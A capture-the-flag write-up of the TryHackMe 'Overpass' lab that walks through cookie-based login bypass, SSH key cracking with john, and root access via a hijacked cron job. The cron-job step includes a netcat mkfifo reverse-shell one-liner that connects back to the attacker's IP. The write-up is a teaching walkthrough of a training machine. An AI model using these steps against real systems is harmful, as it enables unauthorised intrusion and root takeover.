---
title: "TryHackMe - Overpass"
date: 2023-05-22 09:31:00 +0300
image: /assets/img/Posts/overpass.webp
categories: [Tryhackme, Easy]
tags: [cronjobs, cookies, web, john the ripper, ssh]
---

| Room       | [Overpass](https://tryhackme.com/room/overpass)            |
| ---------- | ---------------------------------------------------------- |
| Author     | [tryhackme](https://tryhackme.com/p/tryhackme)             |
| Difficulty | Easy                                                       |

> description: What happens when some broke CompSci students make a password manager? I guess we are about to find out.
{: .prompt-tip }

This write up explains my approach towards solving overpass a tryhackme machine was testing on a bit of OWASP top 10, john and cron jobs.

## Let's begin
First we start with nmap scan using the command `sudo nmap -A -sV -T4 [target IP] -oN nmap.txt`. We find that only two ports are open, `22` and `80`. We know that port `22` runs SSH right? and port `80` is always http.
![image](/assets/img/Posts/overpass/nmap_overpass.webp)

So i went on and opened my browser and visited the website that is running on the machine at port `80` just by pasting the IP in the url tab.
![image](/assets/img/Posts/overpass/welcome_overpass.webp)
Navigating through the web, i found nothing juicy that i could use against the machine. So i went on and tried to scan for any hidden the directories using gobuster and found an /admin directory, wow!!
```bash
gobuster dir -e -u http://[targetIP] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php -t 50 | tee gobustlog
```
<!--![image](/assets/img/Posts/overpass/gobusteroverpass.webp)-->
we found a login for the admin user but we don’t have any hint on the username or password so far, what now? checking the code? yes, i found a javascript file `login.js`
![image](/assets/img/Posts/overpass/scripts_overpass.webp)

Going through its code, in the very bottom i saw a `login` function which seemed vulnerable and indeed it was. The if condition was checking for the valid credential. If incorrect, it was outputting `Incorrect Credentials`, but if correct, it was setting a Cookie named `SessionToken` and redirecting the user to `/admin`. I wondered if the server was actually validating the cookie and we can utilize that to our benefit by setting any cookie value and hopefully work.
![image](/assets/img/Posts/overpass/vulncode_overpass.webp)

So, there are to ways we can go about this,
First one is, we need to open the developer’s tools by right-clicking on the page and clicking the `inspect` option then we go to `storage` and choose `cookies` and press the `+` at the top right corner and change the name to `SessionToken` and the path to `/`

And the second is opening the console and and setting the cookie

```js
Cookies.set(“SessionToken”, 200)
```
When you are done, you reload the page and boom!!! you have the RSA key for user james as it is mentioned in the text.
![image](/assets/img/Posts/overpass/sshkey.webp)
![image](/assets/img/Posts/overpass/sshkey1.webp)

Copied the key and saved it in my host machine and don’t forget it is encrypted. So we use ss2john to convert it

```bash
ssh2john jamesid > james_id
```

and then crack the password

```bash
john james_id — format=SSH — wordlist=/usr/share/wordlists/rockyou.txt
```
We get the passphrase and to login to the ssh account
![image](/assets/img/Posts/overpass/ssh2john_ovepass.webp)
## user flag
It is is right in the home directory, all you have to do is cat the user.txt file
```bash
cat user.txt
```

## root flag
To get the root flag we should become root user. How? lets see if there is something we can exploit to escalate our privileges

### privilege escalation

I decided to use linpeas (a linux privilege escalation automated script) from this page. i had to get it to the target machine from my host machine. So, i started server in my machine and used wget command in the target machine to download the file from my server

We change its mode to executable 
```bash
chmod +x linpeas.sh
```
and then execute it `./linpeas.sh`

and going through the log or the findings, the cron jobs section caught my eye. it looks like the machine is executing the buildscript.sh from the overpass.thm domain as root…really interesting!!!!!!

So we can change and imitate the directory to the script and change its contents to a reverse shell command and get the shell as root…woow!!.

lets get to it right away
![image](/assets/img/Posts/overpass/crontab_overpass.webp)
From that point, i simulated the `overpass.thm/downloads/src/buildscript.sh` by creating the directory `downloads` and within it, i created `src` and finally created the `buildscript.sh` file and placed a one liner reverse shell netcat command

```bash
mkdir downloads

cd downloads

mkdir src

cd src

nano buildscript.sh

and paste the netcat command in the created file

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <yourIP> 1234 >/tmp/f
```
make it executable
```bash
chmod +x buildscript.sh
```
and started a python server from the base directory where the the downloads dir is located `sudo python3 -m http.server 80`
and in the target machine i added my IP to the /etc/hosts file and with the domain overpass.thm
![image](/assets/img/Posts/overpass/target_hosts_file.webp)
we listen to port specified in the reverse shell command and patiently waited for the connection from the remote machine as root. yes!!!! we got the connection as root!!!

to get the flag
```bash
cat root.txt
```
![image](/assets/img/Posts/overpass/root_overpass.webp)

hope you enjoyed the write up!!. thank you 😁